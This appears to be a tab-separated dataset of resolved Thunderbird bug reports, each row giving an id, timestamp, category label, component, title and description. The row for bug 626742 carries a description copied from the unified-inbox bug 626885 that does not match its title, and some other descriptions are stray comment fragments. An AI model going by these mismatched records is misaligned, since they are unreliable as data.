627811%TAB%1295605768%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Port bug 624970 (display DirectWrite version in about:support)%TAB%Port bug 624970 (display DirectWrite version in about:support)oops at the whitespace -- removed.
627810%TAB%1295605487%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%General%TAB%about:support account sort order reversed%TAB%about:support account sort order reversedOops. Comment on attachment 505877 [details] [diff] [review] fix
626885%TAB%1295365459%TAB%151129%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Folder and Message Lists%TAB%unified inbox only shows messages from one account%TAB%unified inbox only shows messages from one accountUser-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; en-AU; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13 Build Identifier: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101208 Lightning/1.0b2 Thunderbird/3.1.7  I have 2 IMAP accounts in thunderbird. The unified inbox shows both account inboxes (in the folder list), but the 'unified' list of emails only shows from one account (the second in the folder list). The unread count is that for the account shown.  The js Error Console shows no errors..  Reproducible: Always  Steps to Reproduce: 1. launch thunderbird 2. compare 'unified inbox' email list with lists for each individual inbox 3. Actual Results:   the unified inbox shows the same list as the second (of 2) inboxes. none of the emails in the first inbox appear in the unified inbox.  Expected Results:   unified inbox merges the email lists from the 2 inboxes  I'm not sure how to get further information on this, nor when it started happening. As far as I recall, the unified inbox was working fine when I installed thunderbird on this computer. It was after some time that I noticed the problem when I didn't see some emails until I checked my mail on another device.   a possible red herrings: - this probably happened after installing lightning. I also had some trouble with lighning: see https://bugzilla.mozilla.org/show_bug.cgi?id=624981 Perhaps those troubles did something to my profile??  Is there something I can check in my profile? Some part of my profile I can put here for an expert eye to peruse?
626742%TAB%1295349492%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Give editMessageButton button appearance%TAB%Give editMessageButton button appearanceUser-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; en-AU; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13 Build Identifier: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101208 Lightning/1.0b2 Thunderbird/3.1.7  I have 2 IMAP accounts in thunderbird. The unified inbox shows both account inboxes (in the folder list), but the 'unified' list of emails only shows from one account (the second in the folder list). The unread count is that for the account shown.  The js Error Console shows no errors..  Reproducible: Always  Steps to Reproduce: 1. launch thunderbird 2. compare 'unified inbox' email list with lists for each individual inbox 3. Actual Results:   the unified inbox shows the same list as the second (of 2) inboxes. none of the emails in the first inbox appear in the unified inbox.  Expected Results:   unified inbox merges the email lists from the 2 inboxes  I'm not sure how to get further information on this, nor when it started happening. As far as I recall, the unified inbox was working fine when I installed thunderbird on this computer. It was after some time that I noticed the problem when I didn't see some emails until I checked my mail on another device.   a possible red herrings: - this probably happened after installing lightning. I also had some trouble with lighning: see https://bugzilla.mozilla.org/show_bug.cgi?id=624981 Perhaps those troubles did something to my profile??  Is there something I can check in my profile? Some part of my profile I can put here for an expert eye to peruse?
626735%TAB%1295348931%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Set opacity only on qfb-tags .toolbarbutton-icon%TAB%Set opacity only on qfb-tags .toolbarbutton-iconThe opacity is applied on .toolbarbutton-icon and .toolbarbutton-text. This patch corrects this by only applying on .toolbarbutton-icon
626076%TAB%1295079214%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Add spellcheck UI in the context menu, à la Firefox, for all HTML Textareas%TAB%Add spellcheck UI in the context menu, à la Firefox, for all HTML TextareasThe idea is that the right-click menu should be able to deal with HTML Textareas that have spellcheck="true". Extensions might want a cheap way to spellcheck some of their user input, and I believe this is potentially useful for at least Thunderbird Air as well as Thunderbird Conversations.  This is mostly copy/paste from Firefox with minor improvements and some Thunderbird tweaks. This looks like a potentially nice feature to have: AFAIK, we have no HTML Textareas, so this won't impact our UI. Simply, it will allows extension authors to easily spellcheck their contents (assuming they use HTML, of course).
626047%TAB%1295064316%TAB%256169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Items "Regular" "Bigger" "Smaller"  in Size choice dropdown menu are cropped%TAB%Items "Regular" "Bigger" "Smaller"  in Size choice dropdown menu are croppedUser-Agent:       Mozilla/5.0 (X11; Linux i686; rv:2.0b10pre) Gecko/20110114 Firefox/4.0b10pre Build Identifier: Mozilla/5.0 (X11; Linux i686; rv:2.0b8pre) Gecko/20101116 Thunderbird/3.3a1  Items in the dropdown menu for Size of the texte choice are not completely readable unless you click to see the whole list  Reproducible: Always  Steps to Reproduce: 1. Goto Edit>Preferences>Display tab 2. The plain Texte Messages zone offers a Size choice  Words are not completely visible Actual Results:    Words are not completely visible  Expected Results:   It would be better to have the default choice at least learly visible without clicking  Please note that I have no such visual issue on Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:1.9.2.13) Gecko/20101207 Thunderbird/3.1.7
626019%TAB%1295048227%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs,Theme%TAB%No update.png in aero/messenger/icons/%TAB%No update.png in aero/messenger/icons/After landing of Bug 571759 no icon is shown under Win7 in the notification bar
625472%TAB%1294920787%TAB%310218%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Search%TAB%Quick search processes input after hiding it with escape,Esc dismisses quick-filter-bar (threadpane) filter but keeps focus, input still in filter entry%TAB%Quick search processes input after hiding it with escape,Esc dismisses quick-filter-bar (threadpane) filter but keeps focus, input still in filter entryWhen you have a folder open with a selected message and quick filter toggled on then after escaping filter with CTRL+F to focus it and ESC to close the bar further input is still being processed.  In my case I wanted to untag a message when I noticed filter was on (as in the bar was visible with no conditions applied) and switched it off. Then I entered tag number and expected the message to be untagged. Instead quick filter processed that number and all but one email in the view was suddenly gone because no other mail matched this condition. I would expect that focus in email list should be restored after escaping the bar instead.
625361%TAB%1294899892%TAB%339434%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Build Config%TAB%Enable nsIBrowserSearchService in Thunderbird.%TAB%Enable nsIBrowserSearchService in Thunderbird.I'm developing an addon which lets users search for terms in Thunderbird, and so using the same search engine service as Firefox seems like a good idea.
625146%TAB%1294830765%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Testing Infrastructure%TAB%Don't count MozMill support functions as tests%TAB%Don't count MozMill support functions as testsThis gives us a more realistic idea of the number of tests we have.
624440%TAB%1294652683%TAB%49577%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%Fully fix onComposerFromChanged() after bug 337964%TAB%Fully fix onComposerFromChanged() after bug 337964I filed (SM port) bug 624432, but I'm puzzled by the "changed" case(s) of bug 337964 fix.  I'm confused by the vars being named 'g*OptionChanged' (which seems correct to me) versus the comments about 'manually checked' [Couldn't the case be "manually unchecked" too?] Shouldn't useEncryption/useSigning value be explicitly set in !=/!signMessage cases too? Shouldn't gEncryptOptionChanged and gSignOptionChanged be reset to false in some case(s)?  If the code is correct as is, maybe just modifying/adding some more comments would clarify it.
624341%TAB%1294623192%TAB%403731%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%Update check for default mailer to work the new way (glib >= 2.27.1)%TAB%Update check for default mailer to work the new way (glib >= 2.27.1)User-Agent:       Mozilla/5.0 (X11; U; Linux i686; fr-fr) AppleWebKit/534.7+ (KHTML, like Gecko) Version/5.0 Safari/534.7+ SUSE/11.4 (2.30.6-97.5) Epiphany/2.30.6 Build Identifier:   I assume Thunderbird checks if it's the default mail application on start, in the same way Firefox does for the default browser application. This means that most of bug 624338 is valid for Thunderbird too, although.  Starting with glib 2.27.1, the way for an app to declare that it supports opening a URI scheme has changed: it used to be something living in gconf, and now we use the mime system with a mime type like x-scheme-handler/mailto. The old way doesn't work anymore.  glib 2.27/2.28 will be used in all distributions releasing in spring 2011.  See https://bugzilla.gnome.org/show_bug.cgi?id=631433 and the first part of http://www.hadess.net/2010/10/new-control-center-and-you.html for some more background.  Bug 624338 contains detailed steps based on the Firefox code to fix this. I haven't looked at the Thunderbird code, though, so I can't give the same detailed steps, but it should be straight-forward for anyone knowing the code.  Reproducible: Always
624150%TAB%1294473072%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Generalize about:rights code into an about: redirector%TAB%Generalize about:rights code into an about: redirectorWe will want to map the about:support URI to our own page, and for that we need a full-fledged redirector. The code is really a JS version of https://mxr.mozilla.org/comm-central/source/mozilla/browser/components/about/AboutRedirector.cpp. (The reason I don't have tests for this is that it'll be tested as part of the about:support tests.)
624108%TAB%1294442514%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Land about:support%TAB%Land about:supportabout:support is a useful troubleshooting tool. The idea is to have a list of account settings and modified prefs in one spot, and to provide easy and safe means of communicating these settings to people who can help troubleshoot an issue.
624092%TAB%1294427265%TAB%403621%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Error in Thunderbird's javascript code - use of undefined object (SubscribeOnLoad() in chrome://messenger/content/subscribe.js)%TAB%Error in Thunderbird's javascript code - use of undefined object (SubscribeOnLoad() in chrome://messenger/content/subscribe.js)User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0E) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101207 Thunderbird/3.1.7  At one time I got an error message in Thunderbird's Error Console stating that an uninitialized 'serverMenu' variable is being used at line 255 of the chrome://messenger/content/subscribe.js module - function SubscribeOnLoad().  After reviewing the code I see how this can happen - this variable is initialized in one 'if (folder && folder.server instanceof Components.interfaces.nsISubscribableServer)' branch but is later used in the next 'if (!gServerURI)' branch independently of the first one. So if the program does not enter the first branch but enters the second one - you get this error.  Should be easy to   Reproducible: Always  Steps to Reproduce: No need to reproduce this - it is obvious from the code how it can go badly. Actual Results:   Code fails.  Expected Results:   Code runs on as expected.  My guess is that you should just move the:    var serverMenu = document.getElementById("serverMenu");  variable declaration in front of its current 'if (folder && folder.server instanceof Components.interfaces.nsISubscribableServer)' branch.
623503%TAB%1294287515%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Factor out MozMill content-tab helpers into a separate file%TAB%Factor out MozMill content-tab helpers into a separate fileI'm going to need this for the about:support tests.
623346%TAB%1294234994%TAB%355920%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Compose Window%TAB%Show Total File Size of all attachments%TAB%Show Total File Size of all attachmentsUser-Agent:       Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20110104 Firefox/4.0b9pre Build Identifier: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b9pre) Gecko/20110105 Thunderbird/3.3a2pre  Would be nice if TB would show the total file size of all attachments, e. g. obove the attachment box right next to the word "ATTACHMENTS:" --> see attached screenshot --> yellow area could display the total file size of all attachments.  Then the user could see how big the message will become in total and if the e-mail's size will exceed his e-mail-provider's message-size-restrictions.  Reproducible: Always
623151%TAB%1294187246%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Migration%TAB%Migration assistant installation of add-ons no longer works on trunk builds%TAB%Migration assistant installation of add-ons no longer works on trunk buildsPicked up from a tester via getsatisfaction. If you try and use the migration assistant to install the extra folder columns or compact header add-ons, then it just offers you the file to download rather than installing them.  The error console points to extensionConfigurator.onLoad being the problem as that uses Application.extensions which is no longer valid.  It also uses logException which isn't defined in that file/scope.
622343%TAB%1293866809%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Junk icon is missing its description text in the customize menu%TAB%Junk icon is missing its description text in the customize menuIf you open the standalone window to read a mail than the junk icon in the customize menu dialog is missing its text.  STR: 1. Open a message in the standalone message window 2. Be sure that you have no Junk button, so the junk icon will be in the customize dialog 3. Open the customize dialog --> The Junk icon has no text
621190%TAB%1293099772%TAB%402563%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%contacts added to address book lost after closing and opening thunderbird%TAB%contacts added to address book lost after closing and opening thunderbirdUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101207 Thunderbird/3.1.7  when adding contacts to the collected addresses book as long as i have thunderbird opened i can use that address whenb doing a write. If i close thunderbird and reopen it that contact is gone from all address books.  Reproducible: Always
620781%TAB%1292935096%TAB%301863%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%add dictionary switching to the spell check context menu,Add dictionary switching in the compose window context menu%TAB%add dictionary switching to the spell check context menu,Add dictionary switching in the compose window context menuThis is coming from a suggestion in the dev.usability google group https://groups.google.com/forum/?fromgroups#!topic/mozilla.dev.usability/OxUZQQReYj0  Right now in Firefox you can easily switch spell check languages via the context menu but this isn't available in Thunderbird.
620638%TAB%1292893286%TAB%256169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%List of messages (central pane) recovering left-hand side panel%TAB%List of messages (central pane) recovering left-hand side panelUser-Agent:       Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.2.13) Gecko/20101203 Ant.com Toolbar 2.1.0rc Firefox/3.6.13 Build Identifier: Mozilla/5.0 (X11; Linux i686; rv:2.0b9pre) Gecko/20101220 Thunderbird/3.3a2pre  See screenshot.   Reproducible: Always  Steps to Reproduce: 1. download shredder above-mentioned version. Install it on my /home. Profile is in a win directory (common to Ubuntu and win. 2. at first start, News from shredder are displaye in a tab (nothing special) 3. the other tab with my account has a twisted layout Actual Results:   Uneasy to read info from left pane  Expected Results:   I would prefer something less messy :D  * Please note that I restarted in safe-mode and dis not encounter any problem with layout -> I deleted every extension from the addon manager, then deleted everything in the extension folder from the profile and restarted, BUT I have still the messy layout
620467%TAB%1292843319%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Give Account Central system colors%TAB%Give Account Central system colorsThe Account Central has hard coded colors and the titles have appearance toolbox, which looks on Vista and Win7 odd.
620022%TAB%1292595151%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%should clear message display when switching to summarize view%TAB%should clear message display when switching to summarize viewSTR:  1. Select a single message. 2. control select a different message. 3. Select a third message.  The single message flashes, and then we display the third message. We shouldn't display the first message (it's just because we're switching which browser messagepanebox uses in messenger.xul, so we briefly redisplay the browser containing the first message). If we happen to reselect the first message, then the current behavior would be a win, but that happens way less than half the time.  My proposal is to clear the message pane when we switch from displaying a single message to message summaries. Patch upcoming.
619843%TAB%1292516252%TAB%228074%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%No preferences for search dialog checkboxes "Search subfolders" and "Run search on server",Persist the checkbox values for the advanced search dialog ("Search subfolders" and "Run search on server")%TAB%No preferences for search dialog checkboxes "Search subfolders" and "Run search on server",Persist the checkbox values for the advanced search dialog ("Search subfolders" and "Run search on server")The defaults of these two dialog checkboxes aren't persistent.  I.e. if you change then, run a search, close the dialog... and then reopen it again, the original values will be present.  This isn't very handy if, like me, you have dozens of sub-mailboxes, but do most of your searches in your Inbox and server-side.  In that case, you'd want to change your preferences to disable "Search subfolders", and enable "Run search on server" (which should be the default on IMAP3 anyway).  Please add preferences for these.
619718%TAB%1292491107%TAB%317237%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%-setDefaultMail does not set Thunderbird as default mail client%TAB%-setDefaultMail does not set Thunderbird as default mail clientUser-Agent:       Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.19 Safari/534.13 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13; Gecko/20101207 Thunderbird 3.1.7  Under Windows XP, fresh install of Thunderbird 3.1.7 through commandline (with argument -ms), I am unable to set Thunderbird as default mail client with the command: "%programfiles%\Mozilla Thunderbird\thunderbird.exe" -silent -setDefaultMail  I'd expect that command to work as documented on the wiki: https://developer.mozilla.org/en/Command_Line_Options#-setDefaultMail  Reproducible: Always  Steps to Reproduce: 1. Have a different email client to be set as default (e.g, outlook) 2. Install thunderbird 3.1.7, do not check the option to set it as default if using the GUI / or install using command line and argument "-ms" 3. Hit Start -> Run, then: "%programfiles%\Mozilla Thunderbird\thunderbird.exe" -silent -setDefaultMail 4. Open Thunderbird Actual Results:   Thunderbird complains that it is not default and asks if you want it to be set as default  Expected Results:   Thunderbird should be set as default  Context: Automated deployment of thunderbird on a high number of workstations.  Once firefox is installed in command line with the "-ms" argument, if I run: "%programfiles%\Mozilla Firefox\firefox.exe" -silent -setDefaultBrowser  Firefox is set as default browser properly.
619325%TAB%1292391558%TAB%401881%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%When skimming over messages in a RSS feed, Thunderbird loads the wrong message%TAB%When skimming over messages in a RSS feed, Thunderbird loads the wrong messageUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.13) Gecko/20101207 Thunderbird/3.1.7  This started to happen regularly, I think with version 3, I don't recall having that issue with TB2.  When I skim over messages (reading or deleting) in a selected RSS feeds, Thunderbird shows the right URL and reference for the message, but loads a previous messages (the attached screenshot shows the result when I quickly hit delete on the messages I'm not interested in).  Reproducible: Always  Steps to Reproduce: 1. Load an RSS feed 2. Select an old message 3. Delete that message (and a few of the following messages) very quickly   Expected Results:   Loaded the message for which it shows the URI
619302%TAB%1292379539%TAB%36118%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%New account wizard doesn't accept right username,[autoconfig] Account creation wizard doesn't enable "Edit" button,[autoconfig] "Edit" button not enabled%TAB%New account wizard doesn't accept right username,[autoconfig] Account creation wizard doesn't enable "Edit" button,[autoconfig] "Edit" button not enabledUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729) Build Identifier: 3.1.7  Made autoconfig .xml which found right servers, but wizard guessed username (obviously, as always) wrong. It then prompted to enter the username. Entered right username. Wizard doesn't accept it. If I "re-test" it forgets the right servers. If I press "manual setup" and immediately press "create account" it works.  Reproducible: Always  Steps to Reproduce: 1. Create new account 2. Notice prompt for wrong username, fix it. 3. Notice how wizard doesn't accept it. Actual Results:   Wizard doesn't accept corrected username  Expected Results:   Wizard should accept corrected username
619071%TAB%1292310857%TAB%188156%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%gd / Scottish Gaelic,Build Config%TAB%Getting set up for Tb 3.2%TAB%Getting set up for Tb 3.2I've done all the strings for Tb 3.2 on Narro and would like getting started on nightlies for that.  I have a local l10n-central repo (Thanks Milos!) but there's something at your end that needs doing I think. Apologies, not sure what it's called what you have to do.
618528%TAB%1292015312%TAB%309770%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Networking: NNTP,Mail Window Front End%TAB%Newsgroups subscribe dialog content is broken,subscribe dialog content is broken%TAB%Newsgroups subscribe dialog content is broken,subscribe dialog content is brokenUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; ja; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 Build Identifier: Mozilla/5.0 (Windows NT 5.1; rv:2.0b8pre) Gecko/20101210 Thunderbird/3.3a2pre Build ID: 20101210030013  Subscribe dialog window content for newsgroups is broken.  Reproducible: Always  Steps to Reproduce: 1.Setup newsgroups account (e.g. news.mozilla.org). 2.Right click on newsgroups account folder on the folder pane. 3.Choose "Subscribe..."  Actual Results:   Open broken Subscribe dialog window. On the error console: ========== Error: goUpdateCommand is not defined Source file: chrome://messenger/content/mailWindow.js Line: 171 ==========   Expected Results:   Open Normal Subscribe dialog window.   On the Miramar 3.3a1(Mozilla/5.0 (Windows NT 5.1; rv:2.0b8pre) Gecko/20101116 Thunderbird/3.3a1 Build ID: 20101116152258), Subscribe dialog window is normal.
618467%TAB%1291990514%TAB%98310%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End,Theme%TAB%pane separator problem - too thin, can't tell what a click would do%TAB%pane separator problem - too thin, can't tell what a click would doUser-Agent:       Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101210 Firefox/4.0b8pre Build Identifier: http://hg.mozilla.org/mozilla-central/rev/2705b22189f9  Quite often, when I try to resize a window pane, it's unnecessarily hard to do.  The new theme on windows 7 somewhat exacerbates this.  I don't think I even noticed on the old theme.  The separator between panes (between the message list, a message, or the folder list) appears as only one pixel wide;  I believe the click-able area of the separator may be wide (maybe just 2) but it's hard to say for sure.  The usual method of telling is that the cursor will change to a two-headed arrow, but that is not working most of the time.  Probably most of the time, there is some pending command submitted to the email server (this may be an unrelated problem but it's certainly commonplace in my experience), so instead of showing the two-headed arrow, it only shows the wait indicator (pointer + spinny thing, as opposed to just the large spinny thing).   Reproducible: Always  Steps to Reproduce: 1. Use new theme 2. Try to stretch pane  Actual Results:   The mouse cursor does not indicate whether you can stretch  Expected Results:   It should be easy to tell whether the mouse is positioned to click for pane-resizing
617906%TAB%1291866424%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Turn on IPC/OOPP in Thunderbird builds%TAB%Turn on IPC/OOPP in Thunderbird buildsWe should turn on inter-process-communication and out-of-process-plugins for nightly builds. The main advantages at this stage are that it brings us closer to the Firefox core so that we're not diverging too far. This should help to reduce random bustages in our code.  The side-effect is that RSS feeds and content-tabs will be able to make use of OOPP if desired.  We'll also have the chance for separating out other processes later on, if I correctly understand the direction that IPC is going in
617839%TAB%1291829031%TAB%251051%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI,Folder and Message Lists%TAB%Switching to threads with a large number of emails is extremely slow%TAB%Switching to threads with a large number of emails is extremely slowI use the Threads with Unread view to read my bugmail.  The volume of bugmail that I receive on some bugs (such as the randomorange bug) is extremely large.  I experience an about 30 seconds of delay whenever I press n to go to the next message, and the next message is in that thread.  I haven't profiled it, but I should be able to do so if you need me to.  This is completely reproducible.
617306%TAB%1291694430%TAB%252849%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Themes show the Buttons at the wrong side%TAB%Themes show the Buttons at the wrong sideUser-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; de-DE; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13 Build Identifier: Mozilla/5.0 (X11; U; Linux x86_64; de-DE; rv:1.9.2.13) Gecko/20101206 Lightning/1.0b2 Mnenhy/0.8.3 Thunderbird/3.1.7  When I select a mail the buttons "Reply, Forward, Archive, ..." are not shown on the right side like they should but on the left. I tried this with the styles Silvermail, Tangobird and Gnome. Only when I use the sdandard theme the buttons are shown at the right side.  Reproducible: Always  Steps to Reproduce: 1. Use a theme that is not the standard one 2. Select a mail
616932%TAB%1291592236%TAB%218420%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%[Quick Filter bar] Missing tag icon%TAB%[Quick Filter bar] Missing tag iconIt seems that the bar has a place for tag icon but the icon isn't there.
616316%TAB%1291300674%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%MozMill runtest.py now depends on simplejson, even on Python 2.6%TAB%MozMill runtest.py now depends on simplejson, even on Python 2.6Python 2.6 bundles a json module, yet runtest.py imports simplejson. simplejson seems to have a binary component, so easy_install can be a problem, particularly on Windows.  davida agrees that we should try for json first, then simplejson. Both have the same API (in fact, from what I can see it's the same code) so it's a very simple fix.
616176%TAB%1291280126%TAB%243995%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Dictionary won't install at all.,Dictionary won't install at all (not notification of incompatible dictionary)%TAB%Dictionary won't install at all.,Dictionary won't install at all (not notification of incompatible dictionary)User-Agent:       Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101129 Firefox/4.0b8pre Build Identifier: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101202 Thunderbird/3.3a2pre  Trying to install Canadian English dictionary from file downloaded off Addons site, which installed fine in Firefox 4.0, no addon installation dialog appears at all and the addon is not installed.  Reproducible: Always  Steps to Reproduce: 1. Download dictionary from site. 2. Open addons tab and select to install addon from file. 3. Select downloaded dictionary and click OK. Actual Results:   Dictionary not installed, no dialog appears to confirm installation or anything.  Expected Results:   Dialog should appear to confirm addon installation, dictionary should be installed, restart should be requested to finish installation, then dictionary should be available for use.  It is a pre-release alpha build, it's possible that something is broken and preventing addons from being installed altogether, I have not tried to install any other addons of any type so I cannot confirm this.
615919%TAB%1291195984%TAB%146008%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%UI race / Undesired trashing or deletion of messages%TAB%UI race / Undesired trashing or deletion of messagesUser-Agent:       Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/534.7 Build Identifier: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.14pre) Gecko/20101201 Lanikai/3.1.8pre  This is using a google IMAP account over SSL.  This has been happening on 2 machines over multiple OS and Thunderbird installs, folder rebuilds, etc.  Reproducible: Sometimes  Steps to Reproduce: 1. Delete a few messages in fairly rapid succession (usually a second apart or less), using the Delete key in the message list pane. 2. Move selection to a different message before Thunderbird is finished resolving the corresponding IMAP transactions, or as happened today, click the close button on an open message tab. Actual Results:   Thunderbird trashes or even deletes (which was _not_ the original action) some additional messages without being asked to.  And yes, I keep count of how many times I press Delete, so I'm getting n+1 deletions.  Expected Results:   My mail is where I left it, unmolested.  A couple of other vaguely-related bits of weird UI and IMAP behaviour which -may- point to architectural issues behind this: (I'll file these as their own bugs eventually but for now they're quite possibly relevant to the overwhelmingly more important issue here)  - Nondeterministic UI behaviour:  Quite frequently, closing a message tab, then quickly using cmd-1 to get back to the Inbox (or otherwise), will result in what appears to be the message preview pane appearing below the message list (I normally have it turned off), but it is NOT checked in the View > Layout menu.  Additionally, if I then go and turn it on, it changes appearance somewhat (thus "what appears to be").  - Weird, probably overly-complicated management of folder actions:  Selecting a group of messages and pressing 'm' to toggle their read/unread status will result in them flipping back and forth to read/unread status a couple of times (I believe it's usually 2-3 transitions total, when one would expect one transition from a sane piece of software).  - Often, using cmd-z to move a message back from the trash will result in the message coming back, and then disappearing a few seconds later.  I don't do this often enough to remember whether it goes back to the trash consistently or sometimes ends up deleted.
615540%TAB%1291096504%TAB%218420%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installer%TAB%Today build (20101129) is broken on Windows%TAB%Today build (20101129) is broken on WindowsSimply don't start (I tried with auto-update and with complete *.exe installer)  Using Windows 7
615526%TAB%1291093430%TAB%379511%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%thunderbird-bin should explicitly link libpixman%TAB%thunderbird-bin should explicitly link libpixmanThe linker behaviour recently changed in Ubuntu, and no longer resolves symbols in libraries that aren't directly linked. nsWindow.o is using symbols directly from pixman, but -lpixman-1 is not passed to the linker because of this check in configure.in:  http://hg.mozilla.org/releases/comm-1.9.2/rev/2b335d50b7f5  Some conversation on #maildev:  <chrisccoulson> i guess that the logic is just the wrong way around isn't it? <Standard8> chrisccoulson: not quite, that ifdef just needs removing and the else part left in <Standard8> it was originally correct  but a day after that change landed  they decided to port that stuff back to 1.9.2  Note, this is only a problem on comm-192
614994%TAB%1290768457%TAB%356256%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Build Config%TAB%Update logo for Miramar branding%TAB%Update logo for Miramar brandingbug 611697 sets up unofficial branding, but it uses Shredder logos. Logos should be updated. Confirmed this was missing from the alpha.  It could have been because it needs a ac_add_options --with-branding=mail/branding/unofficial in the mozconfig file at build.
614933%TAB%1290744730%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%"UpdateJunkButton is not defined" error whenever you finish customizing compose toolbar%TAB%"UpdateJunkButton is not defined" error whenever you finish customizing compose toolbarUser-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.12) Gecko/20101027 Fedora/3.6.12-1.fc14 Firefox/3.6.12 GTB7.1 Build Identifier: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.12) Gecko/20101124 Fedora/1.0-0.36.b2pre.fc14 Thunderbird/3.1.6  Get this (on both Linux and Windows) whenever I customize the compose toolbar and click the Done button:  Error: UpdateJunkButton is not defined Source File: chrome://messenger/content/mailCore.js Line: 210  Problematic because if something wraps the default customizeDone function and calls the original and then does extra work, it fails because the uncaught exception causes the function to stop executing.  Also problematic because normal operations shouldn't cause errors
